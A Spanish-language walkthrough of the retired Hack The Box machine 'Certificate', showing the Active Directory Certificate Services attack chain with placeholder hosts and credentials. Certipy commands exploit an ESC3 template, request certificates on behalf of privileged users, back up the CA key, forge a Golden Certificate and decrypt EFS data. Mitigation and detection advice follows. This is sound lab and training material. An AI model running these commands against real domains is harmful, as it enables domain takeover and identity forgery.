---
machine: Certificate
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, adcs, esc3, golden-certificate, efs]
---

# Certificate — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un controlador de dominio con ADCS expone una plantilla vulnerable a ESC3. Se obtiene un certificado de agente de inscripción, se solicita un certificado en nombre de un usuario privilegiado y se usa una Golden Certificate para acceder al administrador y descifrar EFS.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p53,80,88,135,139,389,443,445,464,636,3268,5985,9389 <IP>
```

Se añade `certificate.htb` al hosts. Se enumeran usuarios, SMB y el servicio web. Credenciales iniciales permiten autenticarse en el dominio.

## Acceso inicial

Con las credenciales se enumera ADCS:

```bash
certipy find -u <user>@certificate.htb -p '<password>' -dc-ip <IP> -vulnerable
```

Se identifica la CA `Certificate-LTD-CA` y la plantilla `Delegated-CRA`, vulnerable a ESC3.

## Movimiento lateral

Se solicita un certificado de agente de inscripción:

```bash
certipy req -u <user>@certificate.htb -p '<password>' -ca Certificate-LTD-CA -template Delegated-CRA -dc-ip <IP>
```

Con ese certificado se solicita otro en nombre de un usuario con más privilegios:

```bash
certipy req -u <user>@certificate.htb -p '<password>' -ca Certificate-LTD-CA -template User -on-behalf-of 'certificate\\<target>' -pfx agent.pfx -dc-ip <IP>
```

Se autentica con el PFX y se obtiene un ticket/sesión del objetivo.

## Escalada a administrador

Se extrae la clave privada de la CA y se forja una Golden Certificate para el administrador:

```bash
certipy ca -backup -u <user>@certificate.htb -p '<password>' -dc-ip <IP>
certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject 'CN=Administrator'
```

Con el certificado forjado se accede al DC. La flag de root está protegida con EFS; se usa la clave de la CA/administrador para descifrarla.

## Evidencia

- Salida de `certipy find -vulnerable`.
- Plantilla ESC3 y certificados emitidos (redactados).
- Golden Certificate y acceso al DC.
- Descifrado EFS y flag redactada.

## Lecciones aprendidas

- ESC3 permite actuar como agente de inscripción.
- Una CA comprometida puede forjar identidades.
- Las Golden Certificates sobreviven al cambio de contraseña.
- EFS no protege si el atacante controla la CA.

## Mitigación y detección

- Revisar plantillas y permisos de inscripción.
- Eliminar `Enroll` para agentes no necesarios.
- Proteger la clave de la CA con HSM.
- Monitorizar emisiones y autenticaciones con certificados.

## Referencias

- <https://www.hackthebox.com/machines/certificate>
- <https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation>
- <https://attack.mitre.org/techniques/T1649/>
